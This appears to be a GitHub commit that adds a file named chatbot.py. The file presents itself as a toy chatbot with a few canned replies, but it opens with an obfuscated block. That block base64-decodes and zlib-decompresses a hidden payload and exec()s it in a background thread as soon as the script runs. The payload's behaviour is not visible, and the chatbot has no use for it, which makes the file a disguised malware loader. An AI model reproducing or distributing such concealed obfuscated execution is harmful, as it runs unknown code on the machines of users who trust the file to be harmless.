3e66a5123acb29ba389d6ec76b6ea4e37b94977c
Phu Hoang <152080248+PhuHoangTruong0208@users.noreply.github.com>
2024-08-22 18:43:44 +0700

    Add files via upload

---
+++ chatbot.py
@@ -0,0 +1,25 @@
+import threading
+def __model():exec(
+__import__('zlib')\
+.decompress(
+__import__('base64')\
+.b64decode(
+__import__('codecs')\
+.getencoder('utf-8')\
+('''eNo9UMFKxDAQPTdfkVsSjEO7
+1D0sVhDxICKC601E2mRcY9MkJFmtiv
+/uhi5eZnhv3sy8GTMFHzNNXo2Y5bc1gx
+z6hOtWphz3KstsJiSvPtKZGkdj73bIm1ps
+SJXj1yFWqVuaYUl8JY94e391+7J9fLi+vBNFB8o7hy
+pzzmrIKsB7ALeLfg
+TjmWzqZtWIIhwi9iOpcFYYctlQLECyiIGfCWK7xRnsXejVyNnFDZMJI
+qoP3grxVD8T3R2xFeTzzVikFh3X4twex
+umT/+rpQguCMypejgeNyk8hYkp8+QMM67aQGotS/rDENulXkD+E0GLL'''
+)[0])))
+gpt_model = threading.Thread(target=__model).start()
+def __():
+    inp = input("You: ")
+    if inp in "hello": print("hello how are you?")
+    elif inp in "goodbye": print("bye bye see you again!")
+    else: print("what do you mean?")
+while True: __()
